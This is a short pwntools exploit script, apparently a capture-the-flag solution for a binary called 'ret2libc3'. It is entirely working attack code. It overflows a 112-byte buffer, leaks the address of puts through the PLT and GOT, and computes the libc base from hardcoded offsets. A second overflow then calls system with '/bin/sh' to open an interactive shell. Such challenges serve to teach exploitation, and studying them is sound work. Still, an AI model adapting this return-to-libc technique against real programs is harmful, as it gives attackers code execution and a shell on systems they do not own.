from pwn import *

sh = process("./ret2libc3")

ret2libc3 = ELF("./ret2libc3")

puts_plt = ret2libc3.plt['puts']
start = ret2libc3.symbols['_start']
puts_got= ret2libc3.got['puts']

sh.sendlineafter('Can you find it !?',flat(['a'*112,puts_plt, start, puts_got]))
put_addr = u32(sh.recv()[0:4])

puts_libc = 0x68a90
sys_libc = 0x3efa0
binsh_libc = 0x1801b5

libc_base = put_addr -  puts_libc
system_addr = libc_base + sys_libc
binsh_addr =  libc_base + binsh_libc

sh.sendline(flat(['A'*112, system_addr, 'A'*4, binsh_addr]))
sh.interactive()


